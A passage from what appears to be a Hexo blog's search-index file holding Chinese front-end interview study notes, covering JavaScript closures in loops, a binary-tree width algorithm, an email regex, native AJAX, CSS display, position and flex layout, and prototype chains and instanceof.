class="built_in">Array</span>(res[left[i]])</span><br><span class="line">                  tmp.push(right[i])   <span class="comment">//push的返回值为push的值</span></span><br><span class="line">                  res[left[i]] = tmp</span><br><span class="line">              &#125;    </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              res[left[i]] = right[i]</span><br><span class="line">          &#125;   </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.22</title>
      <link href="2020/03/22/%E6%97%A5%E5%B8%B8-2020.3.22/"/>
      <url>2020/03/22/%E6%97%A5%E5%B8%B8-2020.3.22/</url>
      
        <content type="html"><![CDATA[<ul><li>算法：求二叉树的宽度</li><li>for循环中的问题详解</li><li>手写正则判断邮箱</li><li>手写原生ajax</li><li>display有哪些属性，flex</li><li>position有哪些属性</li><li>手写一个布局，考虑自适应</li><li>跨域为什么不行，深入聊</li></ul><a id="more"></a><h2 id="算法：求二叉树宽度"><a href="#算法：求二叉树宽度" class="headerlink" title="算法：求二叉树宽度"></a>算法：求二叉树宽度</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> widthOfBinaryTree = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> queue = [&#123; <span class="attr">node</span>: root, <span class="attr">index</span>: <span class="number">1</span> &#125;]</span><br><span class="line">    <span class="keyword">let</span> max = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (queue.length) &#123;</span><br><span class="line">        <span class="keyword">const</span> len = queue.length</span><br><span class="line">        <span class="comment">// 这一层的长度为1不需要计算宽度</span></span><br><span class="line">        <span class="keyword">if</span> (len &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> start = queue[<span class="number">0</span>].index</span><br><span class="line">            <span class="keyword">const</span> end = queue[len - <span class="number">1</span>].index</span><br><span class="line">            <span class="keyword">const</span> width = end - start + <span class="number">1</span></span><br><span class="line">            max = <span class="built_in">Math</span>.max(max, width)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> temp = queue.shift()</span><br><span class="line">            <span class="keyword">const</span> node = temp.node</span><br><span class="line">            <span class="keyword">const</span> index = temp.index</span><br><span class="line">            <span class="comment">// 层序遍历过程中，用index来维护节点索引，一个节点索引是index,那他的左孩子索引是index * 2,右孩子索引是index * 2 +1</span></span><br><span class="line">            node.left &amp;&amp; queue.push(&#123; <span class="attr">node</span>: node.left, <span class="attr">index</span>: index * <span class="number">2</span> &#125;)</span><br><span class="line">            node.right &amp;&amp; queue.push(&#123; <span class="attr">node</span>: node.right, <span class="attr">index</span>: index * <span class="number">2</span> + <span class="number">1</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1-for循环中的问题详解"><a href="#1-for循环中的问题详解" class="headerlink" title="1.for循环中的问题详解"></a>1.for循环中的问题详解</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第四个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> oli = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"li"</span>)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// //相当于</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> i</span></span><br><span class="line"><span class="undefined">    i=0</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    i=1</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">1</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    i=2</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">2</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    i=3</span></span><br><span class="line"><span class="javascript">    oli[<span class="number">3</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript"> <span class="comment">//按照词法作用域查找，会每次都找到全局的i</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法一：改为let</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//let声明了一个块级作用域，以上相当于</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> i = <span class="comment">//隐藏作用域里的i</span></span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//这个时候在执行点击事件时，i会在for循环的第一行找到i的值</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法二：闭包</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="javascript">        (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(i)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;)(i)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法三：暂存数据,和let原理类似</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span></span><br><span class="line"><span class="undefined">        oli[i].index = i</span></span><br><span class="line"><span class="javascript">        oli[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.index)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">//方法四：事件委托</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> oul = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"ul"</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">    oul.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> e = e || <span class="built_in">window</span>.event</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> target = e.target || e.srcElement</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(target.nodeName.toLowerCase() == <span class="string">'li'</span>)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> li=<span class="keyword">this</span>.querySelectorAll(<span class="string">"li"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> index = <span class="built_in">Array</span>.prototype.indexOf.call(li,target);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(index);</span></span><br><span class="line"><span class="undefined">　　　　    &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="string">'foo'</span></span><br><span class="line">    <span class="built_in">console</span>.log(i) <span class="comment">//foo foo foo</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-正则判断邮箱"><a href="#2-正则判断邮箱" class="headerlink" title="2. 正则判断邮箱"></a>2. 正则判断邮箱</h2><p>由于名称是由若干个字母、数字、下划线和中划线组成 [a-zA-Z0-9_-]+</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> reg = <span class="regexp">/^[a-zA-z0-9_-]+@[a-zA-z0-9_-]+(\.[a-zA-z0-9_-]+)+$/</span></span><br><span class="line">reg.test(str)</span><br></pre></td></tr></table></figure><h2 id="3-原生ajax"><a href="#3-原生ajax" class="headerlink" title="3. 原生ajax"></a>3. 原生ajax</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">// 原生ajax实现，非常的简单</span></span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">             <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">             xhr.open(<span class="string">'method'</span>, <span class="string">'url'</span>);</span><br><span class="line">             xhr.send();</span><br><span class="line">             xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> ( xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">200</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">'success'</span>, xhr.responseText);</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">'error'</span>, xhr.responseText);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//readyState</span></span><br><span class="line"><span class="comment">//0：初始化，XMLHttpRequest对象还没有完成初始化</span></span><br><span class="line"><span class="comment">//1：载入，XMLHttpRequest对象开始发送请求</span></span><br><span class="line"><span class="comment">//2：载入完成，XMLHttpRequest对象的请求发送完成</span></span><br><span class="line"><span class="comment">//3：解析，XMLHttpRequest对象开始读取服务器的响应</span></span><br><span class="line"><span class="comment">//4：完成，XMLHttpRequest对象读取服务器响应结束</span></span><br></pre></td></tr></table></figure><h2 id="4-display有哪些属性"><a href="#4-display有哪些属性" class="headerlink" title="4. display有哪些属性"></a>4. display有哪些属性</h2><ul><li><strong>display:none;表示此元素将不被显示。</strong></li><li><strong>display：block;将元素显示为块元素。（又叫块级元素）</strong></li><li><strong>display:inline;将元素显示为内联元素。（又叫行内元素）</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内联元素不可以设置高度、宽度</span><br><span class="line">只能设置左右的margin值和左右的padding值，而不能设置上下的margin值和上下的padding值</span><br><span class="line">常见：span、img、input、a、label、button</span><br></pre></td></tr></table></figure><ul><li><strong>display:inline-block;将元素显示为内联块元素。</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不换行，但可以设置宽高</span><br></pre></td></tr></table></figure><ul><li><strong>display:inherit;规定应该从父元素继承 display 属性的值。</strong></li></ul><h2 id="5-position有哪些属性"><a href="#5-position有哪些属性" class="headerlink" title="5.position有哪些属性"></a>5.position有哪些属性</h2><ul><li>position:static，出现在文档流中，不受top，left影响</li><li>position:relative，相对定位，根据元素原来位置定位，在文档流中</li><li>position:absolute，绝对定位，根据relative的父元素定位，脱离文档流</li><li>positoin:fixed，相对于浏览器窗口固定位置，脱离文档流。</li><li>position:inherit,继承</li><li>position:initial</li><li>position:sticky，</li></ul><blockquote><p> position: sticky; 基于用户的滚动位置来定位。</p></blockquote><p>粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。</p><p>在目标区域以内，它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.top</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.middle</span>,</span></span><br><span class="line"><span class="css">        <span class="selector-class">.bottom</span> &#123;</span></span><br><span class="line"><span class="undefined">            position: relative;</span></span><br><span class="line"><span class="undefined">            background: lightblue;</span></span><br><span class="line"><span class="undefined">            height: 200px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.middle</span> &#123;</span></span><br><span class="line"><span class="undefined">            background: yellow;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.bottom</span> &#123;</span></span><br><span class="line"><span class="undefined">            background: pink;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.fixed</span> &#123;</span></span><br><span class="line"><span class="undefined">            width: 100px;</span></span><br><span class="line"><span class="undefined">            height: 100px;</span></span><br><span class="line"><span class="undefined">            position: fixed;</span></span><br><span class="line"><span class="undefined">            background: red;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fixed"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottom"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--fixed在bottom的左上角，脱离文档流后被覆盖了--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-自适应布局"><a href="#6-自适应布局" class="headerlink" title="6. 自适应布局"></a>6. 自适应布局</h2><p>三栏布局，两边固定，中间自适应</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"layout flex"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flex</span> <span class="selector-class">.left-center-right</span>&#123;</span></span><br><span class="line"><span class="undefined">                display: flex;</span></span><br><span class="line"><span class="undefined">                height: 100px;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flex</span> <span class="selector-class">.left</span>&#123;</span></span><br><span class="line"><span class="undefined">                width: 300px;</span></span><br><span class="line"><span class="undefined">                background-color: red;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flex</span> <span class="selector-class">.center</span>&#123;</span></span><br><span class="line"><span class="undefined">                flex: 1;</span></span><br><span class="line"><span class="undefined">                background-color: yellow;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">            <span class="selector-class">.layout</span><span class="selector-class">.flex</span> <span class="selector-class">.right</span>&#123;</span></span><br><span class="line"><span class="undefined">                width: 300px;</span></span><br><span class="line"><span class="undefined">                background-color: blue;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">"left-center-right"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">               我是中间的自适应元素--flex布局</span><br><span class="line">           <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p> <code>flex</code> 是 <code>flex-grow</code>、<code>flex-shrink</code>、<code>flex-basis</code>的缩写 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.item &#123;flex: 1;&#125;</span><br><span class="line">.item &#123;</span><br><span class="line">    flex-grow: 1;</span><br><span class="line">    flex-shrink: 1;</span><br><span class="line">    flex-basis: 0%;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-为什么会有跨域"><a href="#7-为什么会有跨域" class="headerlink" title="7. 为什么会有跨域"></a>7. 为什么会有跨域</h2><p>JavaScript只能访问和操作自己域下的资源，不能访问和操作其他域下的资源。跨域问题是针对JS和ajax的 </p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.21</title>
      <link href="2020/03/21/%E6%97%A5%E5%B8%B8-2020.3.21/"/>
      <url>2020/03/21/%E6%97%A5%E5%B8%B8-2020.3.21/</url>
      
        <content type="html"><![CDATA[<ul><li>口述一下什么是原型链</li><li>详细理解instanceof</li><li>一道面试题</li><li>数组扁平化带深度参数</li></ul><a id="more"></a><h2 id="1-原型链"><a href="#1-原型链" class="headerlink" title="1.原型链"></a>1.原型链</h2><p>[原型链]：每个对象都有一个指向它的原型（prototype）对象的内部链接。这个原型对象又有自己的原型，直到某个对象的原型为 null 为止（也就是不再有原型指向），组成这条链的最后一环。这种一级一级的链结构就称为原型链（prototype chain）。</p><h2 id="2-instanceof"><a href="#2-instanceof" class="headerlink" title="2. instanceof"></a>2. instanceof</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; instanceof 运算符用来测试一个对象在其原型链中是否存在一个构造函数的 prototype 属性。</span><br><span class="line">&gt; A instanceof B</span><br><span class="line">&gt; //判断 B 的 prototype 属性指向的原型对象(B.prototype)是否在对象 A 的原型链上。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_instanceof</span>(<span class="params">L, R</span>) </span>&#123; <span class="comment">//L为instanceof左表达式，R为右表达式</span></span><br><span class="line">  <span class="keyword">let</span> Ro = R.prototype <span class="comment">//原型</span></span><br><span class="line">  L = L.__proto__ <span class="comment">//隐式原型</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (L === <span class="literal">null</span>) &#123; <span class="comment">//当到达L原型链顶端还未匹配，返回false</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (L === Ro) &#123; <span class="comment">//全等时，返回true</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    L = L.__proto__</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num = <span class="number">1</span></span><br><span class="line">num.__proto__ === <span class="built_in">Number</span>.prototype <span class="comment">// true</span></span><br><span class="line">num <span class="keyword">instanceof</span> <span class="built_in">Number</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">num = <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>)</span><br><span class="line">num.__proto__ === <span class="built_in">Number</span>.prototype <span class="comment">// true</span></span><br><span class="line">num <span class="keyword">instanceof</span> <span class="built_in">Number</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">num.__proto__ === (<span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>)).__proto__ <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="3-一道面试题"><a href="#3-一道面试题" class="headerlink" title="3.一道面试题"></a>3.一道面试题</h2> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ClassA</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">'classA'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> classA = <span class="keyword">new</span> ClassA ()</span><br><span class="line">ClassA.prototype =</span><br><span class="line">classA.__proto__ =</span><br><span class="line">classA <span class="keyword">instanceof</span> ClassA</span><br></pre></td></tr></table></figure><ul><li><p>new 出来的实例 this 指向哪     (新实例)<br>   怎么修改 new 出来的 this 的指向（return一个新对象）<br> 